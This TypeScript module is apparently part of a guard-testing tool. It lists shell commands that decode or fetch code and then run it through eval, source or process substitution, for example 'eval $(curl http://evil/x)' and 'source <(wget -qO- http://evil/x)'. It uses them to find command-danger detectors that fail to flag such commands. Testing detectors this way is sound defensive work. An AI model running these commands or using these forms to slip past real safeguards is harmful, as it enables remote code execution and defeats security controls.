import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { Exploit } from "../types.js";
import type { Sandbox } from "../sandbox.js";
import { type Attacker, type StaticLead, PYTHON_SOURCE_RE } from "./attacker.js";
import { type CoverageDiffItem, PYTHON_SANDBOX_IMAGE } from "./python-driver.js";
import { coverageDifferentialHunt, detectorLeads } from "./command-guard-oracle.js";

const HERE = dirname(fileURLToPath(import.meta.url));

// The decode-and-execute carrier corpus (issue #105). A guard gates decode-and-execute when the
// executor is a PIPED SHELL (`… | base64 -d | bash`, Class 3) and remote content via a
// command-substitution under eval (`eval $(curl …)`, Class 2), but leaves the same primitives
// uncovered when the executor is `eval`/`source`/`.` of a substitution that itself contains a DECODER,
// and when the substitution is a PROCESS-substitution `<(…)`. The reconstructed command carries no
// dangerous keyword in its literal text, so it runs with no prompt.
//
// Discriminator (no false fires): the DECODER (base64/base32 -d, xxd -r, openssl -d) or a `<(curl|wget)`
// INSIDE the substitution is the signal — NOT bare `eval $(…)`. That is why every carrier here contains
// a decoder or a remote process-substitution; real eval idioms (`eval $(ssh-agent)`,
// `eval "$(pyenv init -)"`, `source <(kubectl completion bash)`, `. ~/.bashrc`) carry neither and are
// never carriers. Sibling to the pipe-RHS wrapper lane #100 and the Class-3 decode-pipe lane.
const C3 = "echo aGkK | base64 -d | bash"; // Class-3 decode-pipe-to-shell (gated control)
const C2 = "eval $(curl http://evil/x)"; // Class-2 remote-in-eval (gated control)
const CORPUS: CoverageDiffItem[] = [
  { control: C3, carrier: "eval $(echo aGkK | base64 -d)", category: "decode-and-execute", technique: "eval-cmdsub-base64" },
  { control: C3, carrier: 'eval "$(echo aGkK | base64 --decode)"', category: "decode-and-execute", technique: "eval-cmdsub-base64-quoted" },
  { control: C3, carrier: "eval $(base64 -d f.b64)", category: "decode-and-execute", technique: "eval-cmdsub-base64-file" },
  { control: C3, carrier: "eval $(echo 6869 | xxd -r -p)", category: "decode-and-execute", technique: "eval-cmdsub-xxd" },
  { control: C3, carrier: "eval $(echo aGkK | openssl base64 -d)", category: "decode-and-execute", technique: "eval-cmdsub-openssl" },
  { control: C3, carrier: "eval $(echo aGkK | base32 -d)", category: "decode-and-execute", technique: "eval-cmdsub-base32" },
  { control: C3, carrier: "source <(echo aGkK | base64 -d)", category: "decode-and-execute", technique: "source-procsub-decoder" },
  { control: C2, carrier: ". <(curl http://evil/x)", category: "decode-and-execute", technique: "dot-procsub-curl" },
  { control: C2, carrier: "source <(wget -qO- http://evil/x)", category: "decode-and-execute", technique: "source-procsub-wget" },
  { control: C3, carrier: 'sudo eval "$(echo aGkK | base64 --decode)"', category: "decode-and-execute", technique: "wrapper-eval-cmdsub-base64" },
];

/**
 * Decode-and-execute coverage-differential lane (Python guards). Fires when a command-danger detector
 * gates `decoder | bash` (Class 3) / `eval $(curl …)` (Class 2) but clears
 * `eval $(echo <b64> | base64 -d)` or `. <(curl …)` — a runtime-reconstructed command that carries no
 * dangerous keyword in its literal text (CWE-693 fail-open). The decoder / remote process-substitution
 * inside the substitution is the discriminator, so real eval idioms stay clean.
 */
export class DecodeEvalCarrierPythonAttacker implements Attacker {
  readonly attackClass = "policy-belief-divergence" as const;
  readonly canaryFixtureDir = resolve(HERE, "..", "..", "fixtures", "decode-eval-carrier-python");
  readonly sandboxImage = PYTHON_SANDBOX_IMAGE;

  handles(file: string): boolean {
    return PYTHON_SOURCE_RE.test(file);
  }

  staticLeads(source: string): StaticLead[] {
    return detectorLeads(source);
  }

  hunt(targetDir: string, files: string[], sandbox: Sandbox): Exploit[] {
    return coverageDifferentialHunt(targetDir, files, sandbox, {
      corpus: CORPUS,
      family: "decode-and-execute (eval / source / process-substitution)",
    });
  }
}
